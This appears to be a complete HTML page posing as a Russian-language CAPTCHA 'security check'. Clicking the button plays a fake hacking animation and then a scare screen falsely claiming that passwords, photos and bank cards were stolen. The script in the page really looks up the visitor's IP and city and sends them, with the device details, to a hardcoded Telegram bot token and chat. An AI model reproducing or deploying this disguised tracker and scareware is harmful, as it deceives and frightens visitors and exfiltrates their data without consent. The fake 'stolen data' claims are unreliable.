<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 14px; }
   
        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
        
       
        #terminal { display: none; padding: 20px; line-height: 1.6; }
        .t-red { color: red; font-weight: bold; }
        .t-gold { color: #ff8c00; }

      
        #leak-box { display: none; padding: 20px; }
        .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; margin-bottom: 10px; }
        .green-text { color: #0f0; font-weight: bold; }
        ul { color: #ff4d4d; list-style: none; padding: 0; }
        li { margin-top: 10px; }
    </style>
</head>
<body>

  
    <div id="captcha-box">
        <img src="https://www.gstatic.com" width="80">
        <h2>Подтвердите, что вы не робот</h2>
        <button class="btn-verify" onclick="startHack()">Я не робот</button>
    </div>

 
    <div id="terminal"></div>

 
    <div id="leak-box">
        <div class="danger-ui">
            <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
            <hr color="red">
            <p>> IP: <span id="user-ip" class="green-text">Определение...</span></p>
            <p>> Город: <span id="user-geo" class="green-text">Поиск...</span></p>
            <p>> Устройство: <span id="user-dev" class="green-text">Загрузка...</span></p>
            
            <p style="color: #ff4d4d; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ:</p>
            <ul>
                <li>● Пароли: Chrome, Opera, Edge (извлечено: 42)</li>
                <li>● Фото: найдены личные медиафайлы (1.2 ГБ)</li>
                <li>● Карты: обнаружены данные 2 банковских карт</li>
            </ul>
        </div>
    </div>

    <script>
        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
        const chat_id = "-1003861311533";

        // Функция паузы
        const sleep = ms => new Promise(res => setTimeout(res, ms));

        async function startHack() {
    
            document.getElementById('captcha-box').style.display = 'none';
            const term = document.getElementById('terminal');
            term.style.display = 'block';

             
            const lines = [
                `<span class="t-gold">[TARGET]</span> Инициализация взлома...`,
                `[INFO] Обход защитных протоколов...`,
                `<span class="t-red">[WARNING]</span> Уязвимость найдена в системе`,
                `[INFO] Инжект в процесс браузера...`,
                `[INFO] Сканирование %APPDATA%...`,
                `<span class="t-red">[CRITICAL]</span> Доступ к зашифрованным ключам получен`,
                `[SUCCESS] Извлечение данных завершено.`
            ];

             
            for (let line of lines) {
                let p = document.createElement('p');
                p.innerHTML = line;
                term.appendChild(p);
                window.scrollTo(0, document.body.scrollHeight);
                await sleep(800);  
            }

       
            await sendFullLogs();

     
            term.style.display = 'none';
            document.getElementById('leak-box').style.display = 'block';
        }

        async function sendFullLogs() {
            try {
        
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
              
                document.getElementById('user-ip').innerText = d.ip;
                document.getElementById('user-geo').innerText = d.city;
                document.getElementById('user-dev').innerText = navigator.platform;

             
                const message = `🚀 НОВЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;
                
                
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
                await fetch(url);
                
            } catch (e) {
                 
                const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
            }
        }
    </script>
</body>
</html>
